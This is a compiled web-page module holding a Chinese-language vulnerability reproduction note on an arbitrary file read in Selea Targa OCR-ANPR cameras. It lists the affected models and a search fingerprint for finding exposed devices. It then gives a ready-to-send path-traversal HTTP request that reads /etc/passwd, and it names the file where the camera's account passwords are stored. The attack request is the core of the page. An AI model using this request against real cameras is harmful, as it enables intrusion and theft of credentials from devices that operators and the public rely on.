import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const l={},r=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Selea Selea Targa IP OCR-ANPR Camera iZero
Selea Selea Targa IP OCR-ANPR Camera Targa 512
Selea Selea Targa IP OCR-ANPR Camera Targa 504
Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
Selea Selea Targa IP OCR-ANPR Camera Targa 805
Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
Selea Selea Targa IP OCR-ANPR Camera Targa 750
Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;selea_httpd&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140932431.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>发送如下请求包读取文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140932589.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>摄像头账号密码文件为 <strong>mnt/data/auth/users.json</strong></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202140932748.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),d=[r];function s(t,c){return a(),i("div",null,d)}const o=e(l,[["render",s],["__file","Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞.html.vue"]]);export{o as default};
